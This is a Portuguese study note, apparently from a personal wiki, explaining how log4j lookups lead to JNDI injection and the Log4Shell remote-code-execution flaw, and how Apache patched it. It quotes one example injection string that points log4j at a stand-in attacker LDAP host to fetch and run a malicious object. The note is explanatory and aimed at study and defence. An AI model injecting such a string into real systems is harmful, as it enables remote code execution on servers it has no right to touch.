---
layout: base.njk
title: log4shell
tags: txt
---
#COMPSCI
**Key concepts**: [[format string]], [[jndi injection]] 
O log4j é possivelmente a biblioteca de logging mais utilizada da internet, sendo parte essencial do ecossitema web atual. Porém, seu design a deixou vulnerável para um dos ataques de [[RCE|Remote Code Execution]] em maior escala do mundo: o **log4shell**. Aqui vai um resumo geral de como ela funciona
## O que faz
O log4j introduz capacidades de logging para servidores, permitindo ao programador criar uma instância de "logger" e, assim, armazenar informações diversas
Ex:
```.java
import org.apache.logging.log4j.LogManager
import org.apache.logging.log4j.Logger
import org.apache.logging.log4j.Level

public class HelloLog{
	private static final Logger logger = LogManager.getLogger(); // instancia logger

	public static void main(String[] args){
		logger.info("Hello LSEC"); // armazena a mensagem "Hello LSEC"
	}
}
```

No config file do log4j, o programador pode determinar onde as mensagens estarão sendo armazenadas, podendo ser em um arquivo, no stdout ou até mesmo em um servidor remoto para armazenamento (o mais comum para aplicações em larga escala)

## formatação

Além disso, também é permitida a especificação da **formatação** da mensagem a ser armazenada. 
Ex:
```.xml
	<PatternLayout pattern="[%t] %m %n/>
```
Essa formatação, por exemplo, especifica que toda mensagem tem a seguinte estrutura: 
```
[<nome da thread>] <mensagem> <newline>
```

## lookups
Além disso, o log4j também permite que, nos logs, sejam feitos *lookups*, que podem ser adicionados para enriquecer a mensagem a ser armazenada.
Ex:
```.xml
	<PatternLayout pattern="[%t] $${env:USER} %m %n/>
```
Essa formatação prefixa a variável de ambiente USER do processo que está realizando o log à mensagem a ser registrada
```
[<nome da thread>] <USER> <mensagem> <newline>
```

Apesar da inocência aparente dessa funcionalidade, é necessário perceber que a mensagem em si também pode ser um lookup. Utilizando a primeira formatação (sem lookup) para armazenar uma mensagem, é possível fazer algo assim

```.java
	String usermessage = "${env:USER}"
	logger.info("Test: "+usermessage)
```
resultando na mensagem
```
[<nome da thread>] myuser /n
```

### jndi lookups
funciona da mesma forma que os outros lookups, mas com duas particularidades
- Como usa o [[jndi]], pode retornar qualquer objeto java (como buscar uma instância de user, por exemplo)
- além disso, com um nome [[ldap]], consegue fazer queries para servidores externos (como um banco de dados)
### jndi injection
O fato de que lookups podem executados dentro da mensagem de log, quando aliado aos jndi lookups, montam a situação perfeita para um ataque de [[jndi injection]]. Um usuário pode preencher um campo de input provável de ser registrado pelo log4j (username, por exemplo) com uma string do tipo `${jndi:ldap:servidor-de-ataque.com/objeto-malicioso}`, fazendo com que o log4j se conecte com o servidor malicioso, baixando e executando um objeto malicioso.

O fato de que essa string pode estar em qualquer lugar da mensagem e será avaliada mesmo assim, torna essa vulnerabilidade trivial de abusar. Um atacante pode obscurecer essa string dentro de um request http mais complexo e mais difícil de analisar. Essa é a macroestrutura do ataque [[Log4shell]].

### O que foi feito para tornar a biblioteca segura?
- [Desabilitou](https://github.com/apache/logging-log4j2/commit/c362aff473e9812798ff8f25f30a2619996605d5) jndi por padrão
- [Retirou](https://github.com/apache/logging-log4j2/commit/95b24f77e77e4f1e5cc794df5332643e944fd6f8) suporte a queries a servidores LDAP (e todos os protocolos não java) 


## Como replicar?


## Fontes
- https://www.youtube.com/watch?v=w2F67LbEtnk (# Log4j Vulnerability (Log4Shell) Explained // CVE-2021-44228)
- https://logz.io/blog/how-does-log4j-work/
- https://logging.apache.org/log4j/2.x/manual/lookups.html
- 